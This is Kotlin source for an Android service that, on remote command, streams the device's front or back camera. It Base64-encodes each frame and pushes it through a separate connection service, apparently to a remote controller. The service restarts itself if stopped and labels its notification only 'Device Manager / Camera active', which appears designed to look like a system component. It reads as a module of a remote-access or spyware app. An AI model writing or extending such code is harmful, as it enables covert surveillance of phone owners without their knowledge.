package com.example.admin

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.*
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Base64
import androidx.core.content.ContextCompat
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

class CameraStreamService : Service() {
    companion object {
        const val EXTRA_FACING = "facing"
        private const val NOTIF_ID = 1004
    }

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    private var isStreaming = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(NotificationChannel("cam", "Camera", NotificationManager.IMPORTANCE_LOW))
        startForeground(NOTIF_ID, Notification.Builder(this, "cam")
            .setContentTitle("Device Manager").setContentText("Camera active").setSmallIcon(android.R.drawable.ic_menu_camera).build())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopSelf(); return START_NOT_STICKY }
        val facingStr = intent?.getStringExtra(EXTRA_FACING) ?: "back"
        if (!isStreaming) startCamera(facingStr)
        return START_STICKY
    }

    private fun startCamera(facingStr: String) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            stopSelf(); return
        }
        val facing = if (facingStr == "front") CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val id = cm.cameraIdList.firstOrNull { cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == facing } ?: run { stopSelf(); return }

        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)

        // Low res for fast streaming
        imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                // Compress to 30% (or just send raw JPEG if already small)
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                ConnectionService.push(applicationContext, "camera_frame", b64)
            } catch (e: Exception) {
            } finally {
                image.close()
            }
        }, backgroundHandler)

        try {
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val surface = imageReader!!.surface
                    val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                    request.addTarget(surface)
                    camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            session.setRepeatingRequest(request.build(), null, backgroundHandler)
                            isStreaming = true
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) { stopSelf() }
                    }, backgroundHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); stopSelf() }
            }, backgroundHandler)
        } catch (e: Exception) { stopSelf() }
    }

    override fun onDestroy() {
        isStreaming = false
        captureSession?.close()
        cameraDevice?.close()
        imageReader?.close()
        backgroundThread?.quitSafely()
        super.onDestroy()
    }
}
